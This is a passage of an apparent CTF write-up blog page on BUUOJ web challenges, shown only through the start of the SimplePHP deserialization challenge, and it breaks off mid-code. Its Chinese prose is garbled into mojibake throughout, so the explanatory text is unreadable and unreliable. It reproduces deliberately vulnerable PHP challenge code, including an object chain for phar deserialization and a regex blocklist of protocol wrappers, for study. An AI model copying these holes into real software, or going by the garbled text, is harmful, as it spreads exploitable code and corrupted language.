<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>BUUOJ-Webé¢˜ç›®è®°å½• | F4de&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg">
    <meta name="description" content="è¥¿éƒŠæœ‰å¯†æ—ï¼ŒåŠ©å›å‡ºé‡å›´ã€‚">
    <meta name="keywords" content="Webå®‰å…¨ | CTF">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c3dab397.css" as="style"><link rel="preload" href="/assets/js/app.23243609.js" as="script"><link rel="preload" href="/assets/js/2.b6b5fde6.js" as="script"><link rel="preload" href="/assets/js/9.e2574eb5.js" as="script"><link rel="prefetch" href="/assets/js/10.61fe8e74.js"><link rel="prefetch" href="/assets/js/11.aa0a0e27.js"><link rel="prefetch" href="/assets/js/12.f76d046e.js"><link rel="prefetch" href="/assets/js/13.e7eb76d3.js"><link rel="prefetch" href="/assets/js/14.6843e7d6.js"><link rel="prefetch" href="/assets/js/15.876aebbe.js"><link rel="prefetch" href="/assets/js/16.7bda9fb3.js"><link rel="prefetch" href="/assets/js/17.4d23d90c.js"><link rel="prefetch" href="/assets/js/18.8e3bf455.js"><link rel="prefetch" href="/assets/js/19.e2910e1f.js"><link rel="prefetch" href="/assets/js/20.d3ad9048.js"><link rel="prefetch" href="/assets/js/21.44a5eb88.js"><link rel="prefetch" href="/assets/js/22.9fdb32fe.js"><link rel="prefetch" href="/assets/js/23.a4171f9f.js"><link rel="prefetch" href="/assets/js/24.1dc52702.js"><link rel="prefetch" href="/assets/js/25.0d5d1524.js"><link rel="prefetch" href="/assets/js/26.acc4bd8a.js"><link rel="prefetch" href="/assets/js/27.70c3076c.js"><link rel="prefetch" href="/assets/js/28.a6cd030a.js"><link rel="prefetch" href="/assets/js/29.74b979df.js"><link rel="prefetch" href="/assets/js/3.b2dd61fd.js"><link rel="prefetch" href="/assets/js/30.48245f1e.js"><link rel="prefetch" href="/assets/js/31.100f6dc2.js"><link rel="prefetch" href="/assets/js/32.7fc433c9.js"><link rel="prefetch" href="/assets/js/33.29387a0a.js"><link rel="prefetch" href="/assets/js/34.9de6377e.js"><link rel="prefetch" href="/assets/js/35.8d8e3101.js"><link rel="prefetch" href="/assets/js/36.cffc3ac2.js"><link rel="prefetch" href="/assets/js/37.78556217.js"><link rel="prefetch" href="/assets/js/4.1d65e77b.js"><link rel="prefetch" href="/assets/js/5.477d6d12.js"><link rel="prefetch" href="/assets/js/6.9074f6ba.js"><link rel="prefetch" href="/assets/js/7.3da58132.js"><link rel="prefetch" href="/assets/js/8.10db4dab.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c3dab397.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="ç›®å½•" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="F4de's blog" class="logo"> <span class="site-name can-hide">F4de's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WPæ•´ç†</a></div><div class="nav-item"><a href="/technology/" class="nav-link">æŠ€æœ¯æ–‡ç« </a></div><div class="nav-item"><a href="/study/" class="nav-link">å­¦ä¹ ç¬”è®°</a></div><div class="nav-item"><a href="/essay/" class="nav-link">å…¶å®ƒéšç¬”</a></div><div class="nav-item"><a href="/about/" class="nav-link">å…³äº|å‹é“¾</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg"> <div class="blogger-info"><h3>F4de</h3> <span>Syclover | Web</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WPæ•´ç†</a></div><div class="nav-item"><a href="/technology/" class="nav-link">æŠ€æœ¯æ–‡ç« </a></div><div class="nav-item"><a href="/study/" class="nav-link">å­¦ä¹ ç¬”è®°</a></div><div class="nav-item"><a href="/essay/" class="nav-link">å…¶å®ƒéšç¬”</a></div><div class="nav-item"><a href="/about/" class="nav-link">å…³äº|å‹é“¾</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>BUUOJ</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/5bd5a9/" aria-current="page" class="active sidebar-link">BUUOJé¢˜ç›®è®°å½•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ååºåˆ—åŒ–" class="sidebar-link">ååºåˆ—åŒ–</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#simplephp" class="sidebar-link">SimplePHP</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#babysqliv0" class="sidebar-link">BabysqliV0</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#xssä¹‹å…‰" class="sidebar-link">xssä¹‹å…‰</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#harekazectf2019-easy-notes" class="sidebar-link">[HarekazeCTF2019]Easy Notes</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#sqlæ³¨å…¥" class="sidebar-link">SQLæ³¨å…¥</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#sqli" class="sidebar-link">SQLi</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="sidebar-link">ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#filemanager" class="sidebar-link">filemanager</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#swpu2019-web4" class="sidebar-link">[SWPU2019]Web4</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#æ–‡ä»¶ä¸Šä¼ " class="sidebar-link">æ–‡ä»¶ä¸Šä¼ </a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#cv-maker" class="sidebar-link">CV Maker</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ssti" class="sidebar-link">SSTI</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#double-secret" class="sidebar-link">Double Secret</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#i-flask" class="sidebar-link">I&lt;3Flask</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#flaskapp" class="sidebar-link">FlaskApp</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#flasklight" class="sidebar-link">flasklight</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ciscn2019åä¸œå—èµ›åŒºweb11" class="sidebar-link">CISCN2019åä¸œå—èµ›åŒºWeb11</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#xss" class="sidebar-link">XSS</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#xxe" class="sidebar-link">XXE</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#true-xml-cookbook" class="sidebar-link">True XML cookbook</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#suctf-2018-homework" class="sidebar-link">[SUCTF 2018]Homework</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ssrf" class="sidebar-link">SSRF</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ezä¸‰å‰‘å®¢-ezweb" class="sidebar-link">EZä¸‰å‰‘å®¢-EzWeb</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ç½‘é¼æ¯-2020-ç™½è™ç»„-picdown" class="sidebar-link">[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#å…¶ä»–" class="sidebar-link">å…¶ä»–</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#æ¯ç‡¥çš„æŠ½å¥–" class="sidebar-link">æ¯ç‡¥çš„æŠ½å¥–</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#can-you-guess-it" class="sidebar-link">Can you guess it?</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#encode-and-encode" class="sidebar-link">encode and encode</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#swpu2019-web3" class="sidebar-link">[SWPU2019]Web3</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#cookie-store" class="sidebar-link">Cookie Store</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#avatar-uploader-1" class="sidebar-link">Avatar Uploader 1</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#ciscn2019-åä¸œå—èµ›åŒº-web4" class="sidebar-link">[CISCN2019 åä¸œå—èµ›åŒº]Web4</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#pywebsite" class="sidebar-link">PYWebsite</a></li><li class="sidebar-sub-header"><a href="/pages/5bd5a9/#v-n2020-å…¬å¼€èµ›-checkin" class="sidebar-link">[V&amp;N2020 å…¬å¼€èµ›]CHECKIN</a></li></ul></li></ul></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper bg-style-6"><div class="articleInfo-wrap" data-v-f945b7fe><div class="articleInfo" data-v-f945b7fe><ul class="breadcrumbs" data-v-f945b7fe><li data-v-f945b7fe><a href="/" title="é¦–é¡µ" class="iconfont icon-home router-link-active" data-v-f945b7fe></a></li> <li data-v-f945b7fe><span data-v-f945b7fe>WPè®°å½•</span></li> <li data-v-f945b7fe><span data-v-f945b7fe>BUUOJ</span></li></ul> <div class="info" data-v-f945b7fe><div title="ä½œè€…" class="author iconfont icon-touxiang" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>F4de</a></div> <div title="åˆ›å»ºæ—¶é—´" class="date iconfont icon-riqi" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>2020-07-12</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABKFJREFUSA3tVl1oFVcQnrMbrak3QUgkya1akpJYcrUtIqW1JvFBE9LiQ5v6JmJpolbMg32rVrhgoYK0QiMY6i9Y6EMaW5D+xFJaTYItIuK2Kr3+BJNwkxBj05sQY3b3nM6cs2dv9t7NT/vQJw/sndk5M/PNzJkzewGerP+pAmy+ON8lLzUJgA8ZYxYIYZmGYRnctDaWvJJAmTtfP1pvXsBCCPP8QFcCaRkZYACgDZFO4stNIcBCajEOlmmC9XpJ9bAGCaPaPmzPl32dvLSVu3BWCTQs0XQQ6g0DYgwLIoAZbBCdW/i+781o1VVlm/410mw4h06Y7bIPHNyWDyL4FHkX03Q8SrzNhZTZriieckWt7cL6MM85YcLpsi/7O9/iXFT6MswI0DmmpkSaJ0qLxFIm3+i1THHB3zmBH3PYx9CcykcLOeQVVa7QtdxTgQgEleX2AjHYfwA+2ddV77ruGoJUbhGDI09YSNXyMpUt5ylOzxgbUmtOp7NmbNt8v3arjTBfYELmLUV+M+nSawNNAUqpT3ClJWg5I3BLT+cGW/DXNGCa6tx1aakCGEigArTn4TDIPdrXXYKCZNrHLMCOEPvHBlLQ99s9eHB7EB6NTki73CVPQ2F5MSx/uRQixfmq7rK0wYD8w8E905bnPDfwoWs/rfv93NWN/ZfvwsLIU7A09gxECyISeGJkHAau98L97tuw7NXnoPyNF8FcYGLGKsOs0mN3OEyec9esGW/ZEl945dTP34wlR2FZVQWU1q0Cw8Tr7p+hgLLNL0FPxx/Q35mA8aEUrH6nCgwEl0tn7wUiZYJnNRh6DK4UH/k0lfyrsBKdPVv/AriGIQcEDQZ65LBAGe2Rzui9Ybjz7XUppz1/uKBbyVPGkN3ZAeC6hr0x7Nr38N5+EqkoOm17xpoqR9ohQF55ERSvr4Dkr3chNfC3DMzGJlNBElW8w9nsGQvhNGIzDkXzCg8cLK951xHsFBlTJspJNi3ZFIMF2AeDV3q8DNOB+YHi6QTrChDIWDBRi5U5f+ZMfJLu3ccrqxtdxk4SKH336LFxSmkqefwU5T8fhdSdQf9IVKD6aNiwI/hnmcAZ91isYMJIaCUCx9W098+LgruikeTqzqqxKPUwqJyCPJiyemVVZBOijDGjD38Os0jOiSPL1z3SPjXNANbiNPXAdzTfukjjuknNBbyz3nwgTd3AVFqUJ5hpHlq9MveLnWwttUfoygBmvVjuikxND3znrhsELnZk7k+OjIGxeNEkomyLVta0xxn+HZhjBc4YZ/AFjHjz9u3xRZl2BN4aq9nFwWh16IrQ1aHHEd3j1+4/dB9OtH4e29A2H1DyHQRmOSfQZ1Fy7MHBTGB6J/Djq6p3OxyO2cB+4Car7v/o3GXgfAkj23+x9ID1Teoamo/SXcbvSf2PX7Vc8DdCmE1vN9di+32P9/5YR3vLnhCVGUWBjEkr3yh4H8v9CzmsbdhzOKzsJKM90iFdaTMjRPhGVsakRvOaRidljo6H6G7j+ctrJpsP+4COhDIl0La2+FS4+5mlocBaXY5QnGZysIBYoeSsl5qQzrSj/cgNrfuEzlWBfwA+EjrZyWUvpAAAAABJRU5ErkJggg==">
          BUUOJ-Webé¢˜ç›®è®°å½•
        </h1> <div class="theme-vdoing-content content__default"><blockquote><p>é¢˜ç›®ä¼šåˆ†ç±»è®°å½•å¹¶æ ‡æ³¨å…³é”®è€ƒç‚¹ï¼Œè¿™æ ·ä¹Ÿæ–¹ä¾¿æ—¥åéšæ—¶æ¡èµ·æ¥çœ‹ğŸ¥£ã€‚</p></blockquote> <h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="header-anchor">#</a> ååºåˆ—åŒ–</h2> <h3 id="simplephp"><a href="#simplephp" class="header-anchor">#</a> SimplePHP</h3> <p>å³é”®æŸ¥çœ‹ç½‘é¡µæºä»£ç ä¸€ä¸‹å‘ç°é¢˜ç›®ç»™äº†æç¤º</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712172510.png" alt="image-20200712172510308"></p> <p>å­˜åœ¨ä¸Šä¼ æ–‡ä»¶å’ŒæŸ¥çœ‹æ–‡ä»¶çš„åŠŸèƒ½ï¼ŒæŸ¥çœ‹æ–‡ä»¶çš„é¡µé¢ä¸­å¯ä»¥è§‚å¯Ÿåˆ°urlå¾ˆå¯ç–‘ï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712170838.png" alt="image-20200712170838704" style="zoom:67%;"> <p>ä¼ å‚<code>?file=f1ag.php</code>ï¼Œå‘ç°è¢«è¿‡æ»¤æ‰äº†</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712172617.png" alt="image-20200712172617925" style="zoom:67%;"> <p>ä¼ å‚<code>?file=index.php</code>å¯ä»¥æ‹¿åˆ°index.phpçš„æºç ï¼Œç„¶åå¯ä»¥æ‹¿åˆ°æ‰€æœ‰æºç </p> <p>ä¸‹é¢ç›´æ¥çœ‹å…³é”®ä»£ç ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//function.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//show_source(__FILE__); </span>
<span class="token keyword">include</span> <span class="token double-quoted-string string">&quot;base.php&quot;</span><span class="token punctuation">;</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Content-type: text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;REMOTE_ADDR&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.jpg&quot;</span><span class="token punctuation">;</span> 
    <span class="token comment">//md5(1170.0.2).jpg</span>
    <span class="token comment">//mkdir(&quot;upload&quot;,0777); </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;upload/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;tmp_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;upload/&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;'</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span> 
    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;gif&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;jpeg&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;jpg&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;png&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span><span class="token punctuation">{</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
        <span class="token keyword">else</span> <span class="token punctuation">{</span> 
            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'</span><span class="token punctuation">;</span> 
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p>ä½¿ç”¨ç™½åå•ç­–ç•¥ï¼Œåªå…è®¸ä¸Šä¼ gif jpeg jpg pngæ–‡ä»¶ï¼Œå¹¶ä¼šå¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//class.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">C1e4r</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;hacker~&quot;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;index.php&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
